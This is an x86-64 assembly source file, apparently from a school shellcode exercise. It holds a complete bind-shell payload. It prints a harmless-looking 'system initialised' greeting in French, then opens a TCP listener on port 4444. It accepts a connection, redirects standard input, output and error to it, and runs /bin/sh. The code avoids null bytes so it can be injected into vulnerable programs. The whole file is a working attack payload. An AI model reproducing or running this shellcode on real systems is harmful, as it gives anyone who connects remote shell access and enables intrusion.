BITS 64

global _start

_start:
    
    jmp short call_msg

print_msg:
    pop rsi                 
    mov rax, 1              
    mov rdi, 1              
    mov rdx, msg_len        
    syscall
    jmp continue_shell

call_msg:
    call print_msg
    msg db "Bienvenue en ESGI - Systeme initialise", 0x0a
    msg_len equ $ - msg

continue_shell:
    
    xor     rax, rax
    mov     al, 41
    xor     rdi, rdi
    mov     dil, 2          
    xor     rsi, rsi
    mov     sil, 1         
    xor     rdx, rdx
    syscall
    mov     r12, rax        

   
    xor     rax, rax
    push    rax
    mov     rax, 0x5C110002 ; 
    push    rax
    mov     rsi, rsp
    mov     rax, 49
    mov     rdi, r12
    mov     rdx, 16
    syscall

    
    xor     rax, rax
    mov     al, 50         
    mov     rdi, r12
    xor     rsi, rsi
    syscall

    xor     rax, rax
    mov     al, 43          
    mov     rdi, r12
    xor     rsi, rsi
    xor     rdx, rdx
    syscall
    mov     r13, rax

    xor     rsi, rsi
dup_loop:
    xor     rax, rax
    mov     al, 33          ; Syscall dup2
    mov     rdi, r13
    syscall
    inc     rsi
    cmp     rsi, 3
    jne     dup_loop

   
    xor     rax, rax
    push    rax
    mov     rbx, 0x68732F6E69622F2F ; "//bin/sh"
    push    rbx
    mov     rdi, rsp
    xor     rsi, rsi
    xor     rdx, rdx
    mov     al, 59          ; Syscall execve
    syscall